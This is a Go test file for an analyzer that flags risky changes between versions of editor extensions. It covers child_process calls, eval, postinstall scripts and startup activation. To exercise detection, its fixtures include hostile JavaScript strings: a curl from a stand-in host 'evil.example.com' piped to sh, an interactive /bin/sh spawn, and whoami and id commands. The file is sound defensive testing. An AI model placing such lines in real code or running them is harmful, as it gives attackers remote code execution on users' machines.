package analyzer

import (
	"testing"

	"github.com/dymchenkko/extwatch/internal/extension"
)

func TestAnalyzeDiff(t *testing.T) {
	oldJS := map[string]string{
		"extension.js": `const x = process.env.HOME;`, // process.env pre-exists
	}
	newJS := map[string]string{
		"extension.js": "const x = process.env.HOME;\nconst cp = require('child_process');\ncp.exec('whoami');",
	}
	res := Analyze(extension.Extension{Publisher: "p", Name: "n", Version: "2.0.0"}, "1.0.0", newJS, oldJS, "", "")

	if !res.HasBaseline {
		t.Error("expected HasBaseline=true")
	}
	names := introducedNames(res)
	if names["process.env"] {
		t.Error("process.env pre-existed in old version; should not be introduced")
	}
	if !names["child_process"] || !names["exec("] {
		t.Errorf("expected child_process and exec( introduced, got %v", names)
	}
	if !res.HasHigh() {
		t.Error("expected HasHigh=true (child_process/exec are HIGH)")
	}
}

func TestAnalyzeReuse(t *testing.T) {
	// The previous version legitimately uses spawn() and exec(). The update
	// keeps those exact lines but adds a malicious spawn in a NEW file and a
	// malicious exec on a NEW line of an EXISTING file. Both must be flagged
	// even though the patterns themselves already existed in the baseline.
	oldJS := map[string]string{
		"server.js": "const child_process = require('child_process');\ncp.spawn(serverPath, args);",
		"util.js":   "cp.exec(safeCommand);",
	}
	newJS := map[string]string{
		"server.js": "const child_process = require('child_process');\ncp.spawn(serverPath, args);",
		"util.js":   "const cp = require('child_process');\ncp.exec(safeCommand);\ncp.exec('curl https://evil.example.com | sh');",
		"agent.js":  "const cp = require('child_process');\ncp.spawn('/bin/sh', ['-i']);", // brand-new file
	}
	res := Analyze(extension.Extension{}, "1.0.0", newJS, oldJS, "", "")

	// Build a set of (file -> patterns reported in it) to assert location.
	byFile := map[string][]string{}
	for _, f := range res.Introduced {
		byFile[f.File] = append(byFile[f.File], f.Pattern.Name)
	}
	if len(byFile["server.js"]) != 0 {
		t.Errorf("server.js unchanged; should report nothing, got %v", byFile["server.js"])
	}
	if !contains(byFile["agent.js"], "spawn(") {
		t.Errorf("expected spawn( flagged in new file agent.js, got %v", byFile["agent.js"])
	}
	if !contains(byFile["util.js"], "exec(") {
		t.Errorf("expected new exec( line flagged in util.js, got %v", byFile["util.js"])
	}
	if !res.HasHigh() {
		t.Error("expected HasHigh=true")
	}
}

func TestAnalyzeNoBaseline(t *testing.T) {
	newJS := map[string]string{"a.js": "eval('1')"}
	res := Analyze(extension.Extension{}, "", newJS, nil, "", "")
	if res.HasBaseline {
		t.Error("expected HasBaseline=false when oldJS is nil")
	}
	if !introducedNames(res)["eval("] {
		t.Error("expected eval( reported with no baseline")
	}
}

func TestContextualExec(t *testing.T) {
	// No child_process import: a RegExp.prototype.exec() call must NOT be
	// flagged as shell exec. This is the d3.min.js false positive we fixed.
	res := Analyze(extension.Extension{}, "", map[string]string{
		"lib.js": "const m = /foo/.exec(input); arr.forEach(x => x());",
	}, nil, "", "")
	if introducedNames(res)["exec("] {
		t.Error("exec( should not fire without a child_process import")
	}

	// With child_process imported in the file, exec() is a real finding.
	res2 := Analyze(extension.Extension{}, "", map[string]string{
		"run.js": "const cp = require('child_process'); cp.exec('id');",
	}, nil, "", "")
	if !introducedNames(res2)["exec("] {
		t.Error("exec( should fire when child_process is imported in the file")
	}
}

func TestAnalyzeManifest(t *testing.T) {
	oldManifest := `{"scripts":{"compile":"tsc"},"activationEvents":["onLanguage:go"]}`
	newManifest := `{"scripts":{"compile":"tsc","postinstall":"node setup.js"},` +
		`"activationEvents":["onLanguage:go","onStartupFinished"]}`
	// Non-nil empty oldJS => HasBaseline, so the manifest is diffed not full-scanned.
	res := Analyze(extension.Extension{}, "1.0.0", nil, map[string]string{}, newManifest, oldManifest)

	names := introducedNames(res)
	if !names["postinstall script"] {
		t.Errorf("expected newly-added postinstall script flagged, got %v", names)
	}
	if !names["activation: onStartupFinished"] {
		t.Errorf("expected newly-added onStartupFinished flagged, got %v", names)
	}
	if names["compile script"] {
		t.Error("compile is not a lifecycle script; must not flag")
	}
}

func introducedNames(r Result) map[string]bool {
	m := make(map[string]bool)
	for _, f := range r.Introduced {
		m[f.Pattern.Name] = true
	}
	return m
}

func contains(s []string, v string) bool {
	for _, x := range s {
		if x == v {
			return true
		}
	}
	return false
}
